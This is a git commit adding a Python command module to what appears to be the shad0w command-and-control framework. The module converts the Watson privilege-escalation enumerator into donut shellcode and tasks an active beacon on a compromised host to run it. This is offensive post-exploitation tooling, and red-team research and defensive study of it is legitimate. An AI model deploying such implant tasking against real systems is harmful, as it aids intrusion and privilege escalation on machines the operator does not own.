caca5ac0c9f2a929674d1b34ded8f3936fa60e1f
Flangvik <skiddie@tutanota.com>
2020-06-16 14:05:34 -0400

    Added Watson by @rasta-mouse

---
+++ lib/commands/watson.py
@@ -0,0 +1,54 @@
+#
+# Execute watson on a session
+#
+
+import argparse
+
+from lib import shellcode
+
+__description__ = "Enumerate missing KBs and suggest exploits for PrivESC , by @rasta-mouse"
+
+# identify the task as shellcode execute
+USERCD_EXEC_ID = 0x3000
+
+# location of watson binary
+WATSON_BIN = "/root/shad0w/bin/Watson.x86.exe"
+
+# little hack but lets us pass the args to donut
+class DummyClass(object):
+    def __init__(self):
+        pass
+
+def watson_callback(shad0w, data):
+    print(data)
+
+    return ""
+
+def main(shad0w, args):
+
+    # check we actually have a beacon
+    if shad0w.current_beacon is None:
+        shad0w.debug.log("ERROR: No active beacon", log=True)
+        return
+
+    watson_args = ' '.join(args[1:])
+
+    # kinda a hack to make sure we intergrate nice with the shellcode generator
+    args = DummyClass()
+
+    if len(watson_args) != 0:
+        args.param = watson_args
+    else:
+        args.param = False
+        watson_args = False
+
+    args.cls = False
+    args.method = False
+    args.runtime = False
+    args.appdomain = False
+
+    #Generate donut base64 shellcode with "AnyCpu" as target, local bin is x86
+    b64_comp_data = shellcode.generate(WATSON_BIN, args, watson_args)
+
+    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+    shad0w.beacons[shad0w.current_beacon]["callback"] = watson_callback
